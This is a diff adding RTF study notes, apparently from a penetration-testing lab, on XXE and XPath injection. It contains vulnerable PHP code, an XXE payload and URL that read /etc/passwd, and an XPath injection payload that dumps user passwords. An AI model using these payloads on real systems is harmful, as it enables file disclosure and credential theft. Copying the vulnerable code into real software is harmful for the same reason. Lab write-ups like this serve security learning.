@@ -1,0 +1,82 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
+{\fonttbl\f0\fswiss\fcharset0 Helvetica;\f1\froman\fcharset0 Times-Roman;\f2\fmodern\fcharset0 Courier;
+}
+{\colortbl;\red255\green255\blue255;\red0\green0\blue0;\red127\green127\blue127;\red0\green0\blue0;
+\red251\green0\blue7;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww19400\viewh11220\viewkind0
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\f0\b\fs32 \cf0 \ul \ulc0 XXE
+\b0 \ulnone \
+\
+\pard\pardeftab720\sl280\partightenfactor0
+
+\f1\fs28 \cf2 \expnd0\expndtw0\kerning0
+\outl0\strokewidth0 \strokec2 External Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.
+\f0\fs32 \cf0 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 \
+\ul Example 1\
+\ulnone \
+\pard\pardeftab720\sl280\partightenfactor0
+
+\f2\fs24 \cf2 \cb3 \expnd0\expndtw0\kerning0
+\outl0\strokewidth0 \strokec2 <?php require_once("../header.php"); ?>\
+Hello  \
+<?php\
+  $xml=simplexml_load_string($_GET['xml']);\
+  print_r((string)$xml);\
+?>\
+<?php require_once("../footer.php"); ?>\cb1 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\f0\fs32 \cf0 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 \
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+
+\f1\fs28 \cf2 \expnd0\expndtw0\kerning0
+\outl0\strokewidth0 \strokec2 Attacking payload (read system file: /etc/passwd):\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+
+\f2 \cf4 \cb3 <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>
+\f1 \
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+\cf2 \cb1 PoC (with URL encoded):\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+
+\f2 \cf2 \cb3 http://10.10.10.129/xml/example1.php?xml=%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2ftest%3E
+\f1 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\f0\fs32 \cf0 \cb1 \kerning1\expnd0\expndtw0 \ul \ulc0 \outl0\strokewidth0 Example 2\
+\ulnone \
+\pard\pardeftab720\sl280\partightenfactor0
+
+\f2\fs24 \cf2 \cb3 \expnd0\expndtw0\kerning0
+\outl0\strokewidth0 \strokec2 <?php require_once("../header.php");\
+\
+  $x = "<data><users><user><name>hacker</name><message>Hello hacker</message><password>pentesterlab</password></user><user><name>admin</name><message>Hello admin</message><password>s3cr3tP4ssw0rd</password></user></users></data>";\
+\
+  $xml=simplexml_load_string($x);\
+  $xpath = "users/user/name[.='".$_GET['name']."']/parent::*/message";\
+  $res = ($xml->xpath($xpath));\
+  while(list( ,$node) = each($res)) \{\
+      echo $node;\
+  \}\
+?>\cb1 \
+\
+\pard\pardeftab720\sl280\sa240\partightenfactor0
+
+\f1\fs28 \cf2 From the source code above, we know that variable $_GET[\'91name\'92] has no input validation and can be used to inject evil code.\
+In order to dump all the users' credentials, I use the payload \'93\cf5 \strokec5 \'91 or 1=1]%00\cf2 \strokec2 \'94 to construct the variable $xpath as follows:\
+
+\f2 \cb3 users/user/name[.='' or 1=1]%00']/parent::*/message
+\f1 \
+\cb1 Here 
+\i\b %00
+\i0\b0  will get rid of the following strings.
+\f2 \
+\pard\pardeftab720\sl280\partightenfactor0
+\cf2 \cb3 http://.../xml/example2.php?name=%27%20or%201=1]%00
+\fs24 \
+\cb1 \
+}
